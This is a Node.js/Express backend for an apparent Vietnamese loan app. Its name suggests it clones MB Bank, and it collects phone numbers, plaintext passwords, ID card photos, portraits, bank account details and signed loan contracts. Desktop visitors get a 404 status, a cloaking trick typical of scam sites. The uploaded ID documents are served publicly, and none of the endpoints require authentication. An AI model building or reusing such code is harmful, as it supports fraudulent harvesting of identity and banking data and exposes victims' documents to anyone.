import { Buffer } from "buffer";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import fs from "fs";
import https from "https";
import mongoose from "mongoose";
import multer from "multer";
import path from "path";
import process from "process";
import { fileURLToPath } from "url";

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Access environment variables safely
const PORT = process.env?.PORT || 3000;
const SERVER_URL =
  process.env?.SERVER_URL || "https://cloneweb-uhw9.onrender.com";
const MONGODB_URI =
  process.env?.MONGODB_URI || "mongodb://localhost:27017/cloneapp";

const app = express();

// Create upload directories if they don't exist
const uploadsDir = path.join(__dirname, "uploads");
const avatarsDir = path.join(uploadsDir, "avatars");
const documentsDir = path.join(uploadsDir, "documents");

if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir);
  fs.mkdirSync(avatarsDir);
  fs.mkdirSync(documentsDir);
}

// Configure multer for file storage
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    // Determine directory based on file type
    const uploadType = req.params.type || req.query.type;
    if (uploadType === "portrait" || uploadType === "avatar") {
      cb(null, avatarsDir);
    } else {
      cb(null, documentsDir);
    }
  },
  filename: function (req, file, cb) {
    // Generate unique filename with user ID and timestamp
    const userId = req.params.userId || req.query.userId || "user";
    const timestamp = Date.now();
    const fileExt = path.extname(file.originalname) || ".jpg";
    cb(
      null,
      `${userId}_${req.params.type || req.query.type}_${timestamp}${fileExt}`
    );
  },
});

const upload = multer({ storage });

// Middleware
app.use(
  cors({
    origin: [
      "http://localhost:5173",
      "http://localhost:3000",
      "https://mbbankvay.netlify.app/",
    ],
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    credentials: true,
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);
app.use(express.json({ limit: "50mb" })); // Increase limit for base64 images
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static(path.join(__dirname, "dist")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

// Connect to MongoDB
mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("Could not connect to MongoDB:", err));

// Anti-sleep mechanism for Render free tier
// Ping the server every 14 minutes to prevent it from sleeping
const pingInterval = 14 * 60 * 1000; // 14 minutes in milliseconds

function keepServerAwake() {
  setInterval(() => {
    https
      .get(SERVER_URL, (res) => {
        console.log(
          `[${new Date().toISOString()}] Ping sent to server, status: ${
            res.statusCode
          }`
        );
      })
      .on("error", (err) => {
        console.error(`[${new Date().toISOString()}] Ping error:`, err.message);
      });
  }, pingInterval);

  console.log(
    `Anti-sleep mechanism activated, pinging server every ${
      pingInterval / 60000
    } minutes`
  );
}

// User Schema
const userSchema = new mongoose.Schema({
  phone: {
    type: String,
    required: true,
    unique: true,
    validate: {
      validator: function (v) {
        return /^\d{10}$/.test(v);
      },
      message: (props) => `${props.value} is not a valid phone number!`,
    },
  },
  password: {
    type: String,
    required: true,
    minlength: 6,
  },
  avatarUrl: {
    type: String,
    default: null,
  },
  hasVerifiedDocuments: {
    type: Boolean,
    default: false,
  },
  fullName: {
    type: String,
    default: null,
  },
  personalInfo: {
    idNumber: String,
    gender: String,
    birthDate: String,
    occupation: String,
    income: String,
    loanPurpose: String,
    address: String,
    contactPerson: String,
    relationship: String,
  },
  bankInfo: {
    accountNumber: String,
    accountName: String,
    bank: String,
    bankLogo: String,
    bankId: String,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const User = mongoose.model("User", userSchema);

// Verification Document Schema
const documentSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  documentType: {
    type: String,
    required: true,
    enum: ["frontId", "backId", "portrait"],
  },
  filePath: {
    type: String,
    required: true,
  },
  uploadedAt: {
    type: Date,
    default: Date.now,
  },
});

const Document = mongoose.model("Document", documentSchema);

// Contract Schema
const contractSchema = new mongoose.Schema({
  contractId: {
    type: String,
    required: true,
    unique: true,
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  loanAmount: {
    type: String,
    required: true,
  },
  loanTerm: {
    type: String,
    required: true,
  },
  bankName: {
    type: String,
    default: "",
  },
  contractContent: {
    type: String,
    default: "",
  },
  signatureImage: {
    type: String,
    required: true,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
  createdTime: {
    type: String,
    required: true,
  },
  createdDate: {
    type: String,
    required: true,
  },
});

const Contract = mongoose.model("Contract", contractSchema);

// API Routes
// Sign Up
app.post("/api/auth/signup", async (req, res) => {
  try {
    const { phone, password } = req.body;

    // Check if user already exists
    const existingUser = await User.findOne({ phone });
    if (existingUser) {
      return res.status(400).json({ message: "Số điện thoại đã được đăng ký" });
    }

    // Create new user
    const user = new User({
      phone,
      password, // In a real app, you would hash this
    });

    await user.save();

    res
      .status(201)
      .json({ message: "Đăng ký thành công", user: { phone: user.phone } });
  } catch (error) {
    console.error("Sign up error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Login
app.post("/api/auth/login", async (req, res) => {
  try {
    const { phone, password } = req.body;

    // Find user
    const user = await User.findOne({ phone });

    // Check if user exists and password matches
    if (!user || user.password !== password) {
      return res
        .status(401)
        .json({ message: "Số điện thoại hoặc mật khẩu không đúng" });
    }

    res.status(200).json({
      message: "Đăng nhập thành công",
      user: {
        phone: user.phone,
        id: user._id,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        fullName: user.fullName,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Upload document API - accepts both form data and base64 encoded images
app.post(
  "/api/verification/upload/:type",
  upload.single("image"),
  async (req, res) => {
    try {
      const { userId } = req.body;
      const { type } = req.params;

      if (!userId) {
        return res.status(400).json({ message: "User ID is required" });
      }

      // Find user
      const user = await User.findById(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      let filePath;

      // Handle file upload or base64 image
      if (req.file) {
        // If uploaded via multer
        filePath = `/uploads/${req.file.destination.split("/").pop()}/${
          req.file.filename
        }`;
      } else if (req.body.imageData) {
        // If sent as base64
        const base64Data = req.body.imageData.replace(
          /^data:image\/\w+;base64,/,
          ""
        );
        const buffer = Buffer.from(base64Data, "base64");

        // Create filename
        const timestamp = Date.now();
        const fileExt = ".jpg";
        const filename = `${userId}_${type}_${timestamp}${fileExt}`;

        // Determine directory
        const directory =
          type === "portrait" || type === "avatar" ? avatarsDir : documentsDir;
        filePath = path.join(directory, filename);

        // Save file
        fs.writeFileSync(filePath, buffer);
        filePath = `/uploads/${
          type === "portrait" || type === "avatar" ? "avatars" : "documents"
        }/${filename}`;
      } else {
        return res.status(400).json({ message: "No image provided" });
      }

      // Check if a document of this type already exists
      const existingDoc = await Document.findOne({
        userId: user._id,
        documentType: type,
      });

      if (existingDoc) {
        // Update existing document
        existingDoc.filePath = filePath;
        existingDoc.uploadedAt = Date.now();
        await existingDoc.save();
      } else {
        // Create new document
        const document = new Document({
          userId: user._id,
          documentType: type,
          filePath: filePath,
        });
        await document.save();
      }

      // If portrait, update user's avatar
      if (type === "portrait") {
        user.avatarUrl = filePath;
        await user.save();
      }

      // Check if user has all required documents
      const frontId = await Document.findOne({
        userId: user._id,
        documentType: "frontId",
      });
      const backId = await Document.findOne({
        userId: user._id,
        documentType: "backId",
      });
      const portrait = await Document.findOne({
        userId: user._id,
        documentType: "portrait",
      });

      if (frontId && backId && portrait) {
        user.hasVerifiedDocuments = true;
        await user.save();
      }

      if (filePath) {
        // Return both the relative path (for database storage) and full URL (for frontend)
        const fullUrl = `${SERVER_URL}${filePath}`;
        res.status(200).json({
          message: "File uploaded successfully",
          filePath,
          fileUrl: fullUrl,
          isVerified: user.hasVerifiedDocuments,
        });
      }
    } catch (error) {
      console.error("Upload error:", error);
      res.status(500).json({ message: "Lỗi server" });
    }
  }
);

// Get verification status
app.get("/api/verification/status/:userId", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const frontId = await Document.findOne({
      userId: user._id,
      documentType: "frontId",
    });
    const backId = await Document.findOne({
      userId: user._id,
      documentType: "backId",
    });
    const portrait = await Document.findOne({
      userId: user._id,
      documentType: "portrait",
    });

    // Add full URLs in the response alongside relative paths
    const documentsWithUrls = {};
    if (frontId) {
      documentsWithUrls.frontId = frontId.filePath;
      documentsWithUrls.frontIdUrl = `${SERVER_URL}${frontId.filePath}`;
    }
    if (backId) {
      documentsWithUrls.backId = backId.filePath;
      documentsWithUrls.backIdUrl = `${SERVER_URL}${backId.filePath}`;
    }
    if (portrait) {
      documentsWithUrls.portrait = portrait.filePath;
      documentsWithUrls.portraitUrl = `${SERVER_URL}${portrait.filePath}`;
    }

    res.status(200).json({
      isVerified: user.hasVerifiedDocuments,
      documents: documentsWithUrls,
      avatarUrl: user.avatarUrl,
      avatarFullUrl: user.avatarUrl ? `${SERVER_URL}${user.avatarUrl}` : null,
    });
  } catch (error) {
    console.error("Verification status error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Update user profile with personal information
app.post("/api/users/:userId/profile", async (req, res) => {
  try {
    const { userId } = req.params;
    const profileData = req.body;

    // Find the user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Update user with personal information
    user.fullName = profileData.fullName;
    user.personalInfo = {
      idNumber: profileData.idNumber,
      gender: profileData.gender,
      birthDate: profileData.birthDate,
      occupation: profileData.occupation,
      income: profileData.income,
      loanPurpose: profileData.loanPurpose,
      address: profileData.address,
      contactPerson: profileData.contactPerson,
      relationship: profileData.relationship,
    };

    await user.save();

    res.status(200).json({
      success: true,
      message: "Profile updated successfully",
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Profile update error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user profile
app.get("/api/users/:userId/profile", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      success: true,
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Get profile error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user avatar
app.get("/api/users/:userId/avatar", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    if (!user.avatarUrl) {
      return res.status(404).json({ message: "User has no avatar" });
    }

    res.status(200).json({ avatarUrl: user.avatarUrl });
  } catch (error) {
    console.error("Get avatar error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Update user bank information
app.post("/api/users/:userId/bank-info", async (req, res) => {
  try {
    const { userId } = req.params;
    const bankData = req.body;

    // Find the user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Update user with bank information
    user.bankInfo = {
      accountNumber: bankData.accountNumber,
      accountName: bankData.accountName,
      bank: bankData.bank,
      bankLogo: bankData.bankLogo,
      bankId: bankData.bankId,
    };

    await user.save();

    res.status(200).json({
      success: true,
      message: "Bank information updated successfully",
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
        bankInfo: user.bankInfo,
      },
    });
  } catch (error) {
    console.error("Bank information update error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user bank information
app.get("/api/users/:userId/bank-info", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      success: true,
      bankInfo: user.bankInfo || {
        accountNumber: "",
        accountName: "",
        bank: "",
      },
    });
  } catch (error) {
    console.error("Get bank information error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Health check endpoint for ping
app.get("/health", (req, res) => {
  res.status(200).json({ status: "ok", timestamp: new Date().toISOString() });
});

// Check if user agent is mobile
function isMobile(userAgent) {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    userAgent
  );
}

// Handle all requests - should be after API routes
app.get("*", (req, res) => {
  const userAgent = req.headers["user-agent"];

  // If desktop, set status code to 404
  if (!isMobile(userAgent)) {
    return res.status(404).sendFile(path.join(__dirname, "dist", "index.html"));
  }

  // Send the index.html file
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

// Thêm API endpoint để tạo mã hợp đồng ngẫu nhiên
app.get("/api/contracts/generate-id", async (req, res) => {
  try {
    // Hàm tạo mã hợp đồng ngẫu nhiên 8 chữ số
    const generateContractId = () => {
      return Math.floor(10000000 + Math.random() * 90000000).toString();
    };

    // Kiểm tra tính duy nhất của mã hợp đồng
    let contractId;
    let isUnique = false;

    while (!isUnique) {
      contractId = generateContractId();
      // Kiểm tra xem mã này đã tồn tại chưa
      const existingContract = await Contract.findOne({ contractId });
      if (!existingContract) {
        isUnique = true;
      }
    }

    res.status(200).json({
      success: true,
      contractId,
    });
  } catch (error) {
    console.error("Error generating contract ID:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Thêm API endpoint để lưu hợp đồng
app.post("/api/contracts", async (req, res) => {
  try {
    const {
      userId,
      contractId,
      loanAmount,
      loanTerm,
      bankName,
      contractContent,
      signatureImage,
    } = req.body;

    if (!userId || !contractId || !loanAmount || !loanTerm || !signatureImage) {
      return res.status(400).json({ message: "Thiếu thông tin hợp đồng" });
    }

    // Tạo ngày giờ hiện tại
    const now = new Date();
    const createdTime = now.toLocaleTimeString("vi-VN", {
      hour: "2-digit",
      minute: "2-digit",
    });
    const createdDate = now.toLocaleDateString("vi-VN");

    // Lưu ảnh chữ ký
    const base64Data = signatureImage.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    // Tạo filename cho ảnh chữ ký
    const filename = `signature_${userId}_${contractId}_${Date.now()}.png`;
    const filePath = path.join(documentsDir, filename);

    // Lưu file
    fs.writeFileSync(filePath, buffer);
    const signatureUrl = `/uploads/documents/${filename}`;

    // Tạo hợp đồng mới với thông tin chi tiết
    const contract = new Contract({
      contractId,
      userId,
      loanAmount,
      loanTerm,
      bankName, // Thêm tên ngân hàng
      contractContent, // Thêm nội dung hợp đồng chi tiết
      signatureImage: signatureUrl,
      createdTime,
      createdDate,
    });

    await contract.save();

    res.status(201).json({
      success: true,
      message: "Hợp đồng đã được lưu thành công",
      contract: {
        id: contract._id,
        contractId: contract.contractId,
        createdTime: contract.createdTime,
        createdDate: contract.createdDate,
        signatureUrl: contract.signatureImage,
      },
    });
  } catch (error) {
    console.error("Contract creation error:", error);
    res.status(500).json({ message: "Lỗi server khi lưu hợp đồng" });
  }
});

// Thêm API endpoint để lấy thông tin hợp đồng của user
app.get("/api/users/:userId/contracts", async (req, res) => {
  try {
    const { userId } = req.params;

    console.log("Getting contracts for userId:", userId);

    // Sửa query để đảm bảo objectId được xử lý đúng
    const contracts = await Contract.find({ userId: userId.toString() }).sort({
      createdAt: -1,
    });

    console.log(`Found ${contracts.length} contracts for user ${userId}`);

    res.status(200).json({
      success: true,
      contracts: contracts.map((contract) => ({
        id: contract._id,
        contractId: contract.contractId,
        loanAmount: contract.loanAmount,
        loanTerm: contract.loanTerm,
        createdTime: contract.createdTime,
        createdDate: contract.createdDate,
        signatureUrl: contract.signatureImage,
        bankName: contract.bankName,
      })),
    });
  } catch (error) {
    console.error("Get contracts error:", error);
    res.status(500).json({ message: "Lỗi server", error: error.message });
  }
});

// Thêm API endpoint để upload chữ ký
app.post(
  "/api/verification/upload/signature",
  upload.single("image"),
  async (req, res) => {
    try {
      const { userId } = req.body;

      if (!userId) {
        return res.status(400).json({ message: "User ID is required" });
      }

      // Find user
      const user = await User.findById(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      let filePath;

      // Handle base64 image
      if (req.body.imageData) {
        // If sent as base64
        const base64Data = req.body.imageData.replace(
          /^data:image\/\w+;base64,/,
          ""
        );
        const buffer = Buffer.from(base64Data, "base64");

        // Create filename
        const timestamp = Date.now();
        const fileExt = ".png";
        const filename = `${userId}_signature_${timestamp}${fileExt}`;

        // Save to documents directory
        filePath = path.join(documentsDir, filename);
        fs.writeFileSync(filePath, buffer);

        // Format path for response
        filePath = `/uploads/documents/${filename}`;
      } else {
        return res.status(400).json({ message: "No signature image provided" });
      }

      // Store signature URL in user document if needed
      user.signatureUrl = filePath;
      await user.save();

      res.status(200).json({
        success: true,
        message: "Signature uploaded successfully",
        filePath,
      });
    } catch (error) {
      console.error("Signature upload error:", error);
      res.status(500).json({ message: "Lỗi server" });
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  // Start the anti-sleep mechanism
  keepServerAwake();
});
